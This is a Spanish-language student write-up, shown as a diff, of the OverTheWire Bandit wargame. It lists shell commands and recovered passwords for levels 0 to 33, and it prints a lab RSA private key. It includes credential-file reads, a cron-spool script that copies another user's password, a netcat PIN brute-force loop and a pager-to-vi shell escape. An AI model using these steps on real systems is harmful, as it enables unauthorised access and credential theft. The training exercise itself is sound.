@@ -1,0 +1,414 @@
+SEGURIDAD DE DATOS  ALUMNO: Israel Alejandro Cel Alcocer
+
+Nivel 0: 
+
+1.- ssh bandit0@bandit.labs.overthewire.org -p 2220
+2.- password: bandit0
+
+Nivel 0-1: 
+
+1.- ls -alps
+2.-cat readme
+3.- password:NH2SXQwcBdpmTEzi3bvBHMM9H66vVXjL
+4.- exit
+
+Nivel 1-2: 
+
+1.- ls -alps
+2.-cat ./- 
+3.- password: rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi
+4.- exit
+
+Nivel 2-3:
+
+1.- ls -alps
+2.-cat spaces\ in\ this\ filename 
+3.- password: aBZ0W5EmUfAf7kHTQeOwd8bauFJ2lAiG
+4.-exit
+
+Nivel 3-4:
+1.- ls 
+2.- ls -l
+3.- ls -a inhere/
+4.- cd inhere/
+5.- cat inhere/.hidden o cat.hidden
+6.- password:2EW7BBsr6aMMoJ2HjW067dm8EgX26xNe
+7.- Exit
+
+Nivel 4-5:
+1.-ls -alps
+2.-cd inhere/
+3.-ls
+4.- find . -type f | xargs file
+5.- cat ./-file07
+6.- password:lrIWWI6bB37kxfiCQZqUdOIYfr6eEeqR
+7.- Exit
+
+Nivel 5-6:
+1.- ls
+2.- cd inhere/
+3.- find . -type f -size 1033c ! -executable
+4.- cat ./maybehere07/.file2
+5.- password: P4L4vucdmLnm8I7Vl7jG1ApGSfjYKqJU
+6.- Exit
+
+Nivel 6-7:
+1.- find / -type f -user bandit7 -group bandit6 -size 33c 2>/dev/null
+2.- cat /var/lib/dpkg/info/bandit7.
+3.- password: z7WtoNQU2XfjmMtWA8u5rN4vzqu4v99S
+4.- Exit
+
+Nivel 7-8:
+1.- ls -alps
+2.- cat data.txt
+3.- whatis strings 
+4.- strings data.txt
+5.- cat data.txt | grep millionth
+6.- password: TESKZC0XvTetK0S9xNwm25STk5iWrBvP
+7.- Exit
+
+Nivel 8-9:
+1.- cat data.txt
+2.- man uniq
+3.- sort data.txt | uniq -u
+4.- password: EN632PlfYiZbn3PhVK3XOGSlNInNE00t
+5.- Exit
+
+
+Nivel 9-10:
+1.- strings data.txt | grep -e "="
+2.- password: G7w8LIi6J3kTb8A7j9LgrywtEUlyyp6s
+3.- Exit.
+
+
+Nivel 10-11:
+1.- cat data.txt
+2.- base 
+3.- man base64
+4.- base64 -d data.txt
+5.- password: 6zPeziLdR2RKNdNYFNb6nVCKzphlXHBM
+6.- Exit
+
+Nivel 11-12:
+1.- cat data.txt
+2.- INSTRUCCIÓN: accedemos a la página Cyberchef
+3.- Serch: arrastramos rot 13
+4.- password: JVNBBFSmZwKKOP0XbFXOoW8chDz5yVRv
+5.- Exit
+
+Nivel 12-13:
+1.- cat data.txt
+2.- man xxd
+3.- mkdir /tmp/gabriel
+4.- cp data.txt /tmp/gabriel
+5.- cd /tmp/gabriel
+6.- ls
+7.- xxd -r data.txt > data
+8.-  file data
+9.- man gzip
+10.- mv data.file.gz
+11.- gzip -d file.gz
+12.- ls
+13.- file file 
+14.- mv file file.bz2
+15.- man bzip2
+16.- bzip2 -d file.bz2
+17.- ls
+18.- file file 
+19.- mv file file.gz
+20.- gzip -d file.gz
+21.- file file 
+22.- mv file file.tar
+23.- tar xf file.tar
+24.- ls 
+25.- file data5.bin
+26.- rm file.tar
+27.- rm data
+28.- rm data.txt
+29.- ls
+30.- file data5.bin
+31.- mv data5.bin data.tar
+32.- tar xf data.tar
+33.- ls
+34.- file data6.bin
+35.-  mv data6.bin data.bz2
+36.- bzip2 -d data.bz2 
+37.- ls
+38.- file data
+39.- mv data data.tar
+40.- tar xf data.tar 
+41.- ls
+42.- file data8.bin
+43.- mv data8.bin data.gz
+44.- gzip -d data.gz
+45.- ls
+46.- file data
+47.- cat data
+48.- password: wbWdlBxEir4CaE8LaPhauuOo6pwRmrDw
+49.- Exit
+
+Nivel 13-14:
+1.- ls
+2.- ssh -i sshkey.private bandit14@localhost
+3.- cat /etc/bandit_pass/bandit14
+4.-password: 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
+5.- Exit
+
+Nivel 14-15:
+1.- cat /etc/bandit_pass/bandit14
+2.- nc localhost 30000
+3.- cat /etc/bandit_pass/bandit14
+4.-password: BfMYroe26WYalil77FoDi9qh59eK5xNr
+5.- nc localhost 30000
+6.- Exit
+
+Nivel 15-16:
+1.- cat /etc/bandit_pass/bandit15
+2.- man nc | grep ssl
+3.- man nc
+4.- man ncat
+5.- man ncat | grep ssl
+6.- ncat --ssl localhost 30001
+7.- password: cluFn7wTiGryunymYOu4RcffSxQluehd
+8.- Exit 
+
+Nivel 16-17:
+1.- cat /etc/bandit_pass/bandit16
+2.- nmap localhost -p 31000-32000
+3.- nc localhost 31790
+4.- ncat --ssl localhost 31790
+5.- -----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
+imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
+Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
+DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
+JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
+x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
+KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
+J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
+d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
+YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
+vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
++TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
+8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
+SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
+HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
+SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
+R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
+Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
+R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
+L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
+blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
+YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
+77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
+dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
+vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
+-----END RSA PRIVATE KEY-----
+6.- exit
+7.- vim key (En esta parte añadi la private key)
+8.- chmod 400 key
+9.- ssh -i key bandit17@bandit.labs.overthewire.org -p 2220
+10.- password: VwOSWtCA7lRKkTfbr2IDh6awj9RNZM5e
+11.- Exit
+
+Nivel 17-18:
+1.- man diff
+2.- diff passwords.old passwords.new
+3.- sort passwords.old passwords.new | uniq -u 
+4.- cat passwords.new | grep p6ggwdNHncnmCNxuAt0KtKVq185ZU7AW
+5.- cat passwords.new | grep kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
+6.- cat passwords.new | grep kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
+7.- Password: kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
+8.- Exit
+
+Nivel 18-19:
+1.- ssh bandit18@bandit.labs.overthewire.org -p 2220 ls
+2.- ssh bandit18@bandit.labs.overthewire.org -p 2220 cat readme
+3.- Password: IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
+
+Nivel 19-20:
+1.- ls -la
+2.- ./bandit20-do
+3.- ./bandit20-do ls /etc/bandit_pass
+4.- ./bandit20-do cat /etc/bandit_pass/bandit20
+5.-Password: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+6.- Exit
+
+Nivel 20-21:
+1.- nc -l -p 1234
+2.- nc localhost 1234
+3.- echo -n 'GbKksEFF4yrVs6il55v6gwY5aVje5f0j' | nc -l -p 1234 &
+4.- ./suconnect 1234
+5.- Password: gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
+6.- Exit
+
+Nivel 21-22:
+1.- cd /etc/cron.d/
+2.- ls -l
+3.- cat cronjob_bandit22
+4.- /usr/bin/cronjob_bandit22.sh
+5.- cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+6.- Password: Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+7.- Exit
+
+
+Nivel 22-23:
+
+1.- ls -la /etc/cron.d
+2.- cat /etc/cron.d/cronjob_bandit23
+3.- cat /usr/bin/cronjob_bandit23.sh
+4.- echo I am user bandit23 | md5sum | cut -d ' ' -f 1
+5.- cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+6- Password: jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+7.- Exit
+
+Nivel 23-24:
+1.- cd /etc/cron.d/
+2.- ls -l 
+3.- cat cronjob_bandit24
+4.- cat /usr/bin/cronjob_bandit24.sh
+5.- mkdir /tmp/fcchx
+6.- cd /tmp/fcchx
+7.- touch getx.sh
+8.- chmod 777 getx.sh
+9.- ls -la getx.sh
+10.- vim getx.sh
+-- #!/bin/bash
+-- cat /etc/bandit_pass/bandit24 > /tmp/fcchx/password
+11.- touch password
+12.- chmod 666 password
+13.- ls -la password
+14.- cp getx.sh /var/spool/bandit24/
+15.- cat password
+16.- Password: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+17.- Exit
+
+Nivel 24-25:
+1.- mkdir /tmp/gabrielHT
+2.- cd /tmp/gabrielHT
+3.- nc localhost 30002
+4.- cat /etc/bandit_pass/bandit24
+5.- nc localhost 30002
+6.- vim brute.sh
+7.- chmod 777 brute.sh
+8.- ./brute.sh
+9.- 
+-- #!/bin/bash
+--
+-- bandit24=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+--
+-- for pin in {0000..9999}; do 
+--         echo "$bandit24 $pin"
+-- done | nc localhost 30002
+--
+--
+--
+ "brute.sh"
+10.- vim brute.sh
+11.- ./brute.sh
+12.- Password: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+13.- Exit
+ 
+Nivel 25-26:
+1.- ls
+2.- ssh -i bandit26.sshkey bandit26@localhost
+3.- cat /etc/passwd | grep bandit26
+4.- cat /etc/shells
+5.- cat /usr/bin/showtext
+6.- cat /home/bandit26/text.text
+7.- cat /etc/passwd
+8.- cat /etc/passwd | grep bandit26
+9.- cat /usr/bin/showtext
+-- #!/bin/sh
+-- export TERM=linux
+-- more ~/text.txt  (el comando "more" en el script redimensiona la ventana) de la terminal a un tamaño pequeño.
+
+-- exit 0
+
+10.- ssh -i bandit26.sshkey bandit26@localhost
+NOTA: -- More -- con esta pantalla podemos ingresar a la pantalla de ayuda del comando "More" tecleando "h", luego podemos iniciar el editor vi tecleando la tecla "v" (/usr/bin/vi), dentro del editor tecleamos ":set shell=/bin/bash" y aun dentro de vi ":shell".
+11.- cat /etc/bandit_pass/bandit26
+12.- Password: c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1
+13.- Exit
+
+Nivel 26-27:
+1.- ls -la
+2.- file bandit27-do
+3.-./bandit27-do 
+4.- cat /etc/bandit_pass/bandit27
+5.-Password: 3ba3118a22e93127a4ed485be72ef5ea
+6.- Exit
+
+Nivel 27-28:
+1.- mkdir /tmp/fcch-git
+2.- cd /tmp/fcch-git
+3.- git clone ssh://bandit27-git@localhost/home/bandit27-git/repo
+4.- cat repo/README
+5.- Password: 0ef186ac70e04ea33b4c1853d2526fa2
+6.- Exit
+
+Nivel 28-29:
+1.- mktemp -d
+2.- cd /tmp/tmp.eZoCn1k0on
+3.- git clone ssh://bandit28-git@localhost:2220/home/bandit28-git/repo
+4.- cd repo
+5.- cat README.md
+6.- git log
+7.- git show 14f754b3ba6531a2b89df6ccae6446e8969a41f3
+8.- Password: tQKvmcwNYcFS6vmPHIUSI3ShmsrQZK8S
+9.- Exit
+
+
+Nivel 29-30:
+1.- mkdir /tmp/fcch29git
+2.- cd /tmp/fcch29git
+3.- cat README.md
+4.- git branch
+5.- git branch -a
+6.- git checkout dev
+7.- git log 
+8.- git diff 33ce2e95d9c5d6fb0a40e5ee9a2926903646b4e3 a8af722fccd4206fc3780bd3ede35b2c03886d9b
+9.- Password: 5b90576bedb2cc04c86a9e924ce42faf
+10.- Exit
+
+Nivel 30-31:
+1.- git clone ssh://bandit30-git@localhost/home/bandit30-git/repo
+2.- cd repo
+3.- cat README.md
+4.- git branch -a
+5.- git show-branch --all
+6.- git log
+7.- cat .git/packed-refs
+8.- git show-ref --tags -d
+9.- git show --name-only secret
+10.- Password: 47e603bb428404d265f59c42920d81e5
+11.- Exit
+
+Nivel 31-32:
+1.- mkdir /tmp/fcch31git
+2.- cd /tmp/fcch31git
+3.- git clone ssh://bandit31-git@localhost/home/bandit31-git/repo
+4.- cd repo
+5.- ls -la
+6.- cat README.md
+7.- touch key.txt
+8.- vim key.txt
+-- May I come in?
+9.- cat .gitignore
+-- *.txt
+10.- git add	-f key.txt
+11.- git commit -m 'add key'
+12.- git push -u origin master
+13.- Password: rmCBvG56y58BXzv98yZGdO7ATVL5dW8y 
+
+Nivel 32-33:
+1.- ls
+2.- clear
+>> $0
+3.- pwd
+4.- ls -la 
+5.- file uppershell
+6.- cat uppershell
+7.- cat /etc/bandit_pass/bandit33
+8.- Password: 56a9bf19c63d650ce78e6ec0354ee45e
+9.- Exit
